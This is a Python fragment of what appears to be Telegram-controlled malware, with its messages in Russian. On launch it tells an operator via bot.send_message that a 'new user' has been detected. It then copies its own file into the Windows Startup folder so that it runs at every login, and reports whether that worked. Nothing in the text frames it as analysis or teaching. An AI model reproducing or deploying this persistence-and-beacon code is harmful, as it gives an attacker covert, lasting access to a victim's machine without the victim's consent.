bot.send_message(admin_id, "Обнаружен новый пользователь")

Thisfile = sys.argv[0]
Thisfile_name = os.path.basename(Thisfile) 
user_path = os.path.expanduser('~') 

if not os.path.exists(f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{Thisfile_name}"):
        os.system(f'copy "{Thisfile}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
        bot.send_message(admin_id, f'{Thisfile_name} добавлен в автозагрузку')

def add_to_startup(src_file_path, startup_folder_path):
    file_name = os.path.basename(src_file_path)
    target_path = os.path.join(startup_folder_path, file_name)
    if not os.path.exists(target_path):
        try:
            shutil.copy(src_file_path, target_path)
            bot.send_message(admin_id, f'{file_name} успешно добавлен в автозагрузку')
        except Exception as e:
            bot.send_message(admin_id, f'Ошибка при добавлении {file_name} в автозагрузку: {e}')
    else:
        bot.send_message(admin_id, f'{file_name} уже существует в автозагрузке')

def main2():
    this_file = sys.argv[0]
    user_path = os.path.expanduser('~')
    startup_folder_path = os.path.join(user_path, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    add_to_startup(this_file, startup_folder_path)
